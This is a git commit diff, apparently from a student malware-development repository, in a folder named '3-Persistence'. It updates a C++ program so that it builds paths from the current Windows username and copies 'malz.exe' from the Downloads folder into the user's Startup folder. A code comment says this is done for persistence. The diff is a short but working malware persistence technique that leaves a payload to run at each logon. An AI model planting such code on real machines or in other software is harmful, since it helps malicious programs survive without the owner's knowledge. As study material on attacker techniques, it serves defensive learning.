4c86b67d8a58983dcc6f7f82e9d44ecc488272c8
Anıl Çelik <celik.anil@student.atilim.edu.tr>
2022-11-06 03:23:03 +0300

    Update addtostartup.cpp

--- 3-Persistence/addtostartup.cpp
+++ 3-Persistence/addtostartup.cpp
@@ -4,14 +4,21 @@
 #include <iostream>
 #include <windows.h>
 #include <filesystem>
+#include <string.h>
+#include <cstdlib>
 
 using namespace std;
 namespace fs = std::filesystem;
 
+string username = getenv("USERNAME");
+
 int main() {
     cout << "Pls no copy pasterino!\n";
-    
-    fs::copy("C:\\<TARGET_DIR>\\<TARGET_FILE>", "C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
-    
+
+    string targetFile = "C:\\Users\\" + username + "\\Downloads\\malz.exe";
+    string targetDIR = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malz.exe";
+
+    fs::copy(targetFile, targetDIR); //copy malz.exe to Startup directory for persistence
+
     return 0;
 }
